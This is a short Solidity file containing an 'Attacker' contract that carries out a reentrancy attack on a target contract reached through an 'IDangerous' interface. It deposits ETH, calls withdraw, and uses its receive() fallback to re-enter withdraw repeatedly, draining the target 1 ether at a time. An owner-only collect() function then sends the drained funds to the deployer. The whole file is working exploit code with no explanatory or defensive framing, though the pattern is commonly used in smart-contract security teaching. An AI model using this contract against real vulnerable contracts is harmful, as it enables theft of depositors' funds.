
interface IDangerous {
    function depositMoney() external payable;
    function withdraw(uint amount) external;
}

contract Attacker {
    IDangerous public target;
    address public owner;

    constructor(address _target) {
        target = IDangerous(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Need some ETH");
        target.depositMoney{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        uint bal = address(target).balance;
        if (bal >= 1 ether) {
            target.withdraw(1 ether);
        } else if (bal > 0) {
            target.withdraw(bal);
        }
    }

    function collect() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}

